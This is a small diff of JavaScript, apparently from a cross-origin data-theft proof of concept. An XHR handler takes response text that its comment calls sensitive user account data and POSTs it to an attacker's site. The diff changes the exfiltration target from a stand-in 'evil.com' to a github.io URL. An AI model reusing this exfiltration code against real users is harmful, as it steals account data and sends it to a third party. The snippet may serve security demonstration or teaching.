@@ -41,7 +41,7 @@
             if(this.readyState == 4 && this.status == 200) {
                 var a = this.responseText ; // Sensitive data from user account
                 document.getElementById("demo").innerHTML =a;
-                xhttp.open("POST","http://evil.com",true);// Sending that data to Attacker's website
+                xhttp.open("POST","https://salamoxso.github.io/evil.com/",true);// Sending that data to Attacker's website
                 console.log(a);
                 xhttp.send("data ="+a);
             }
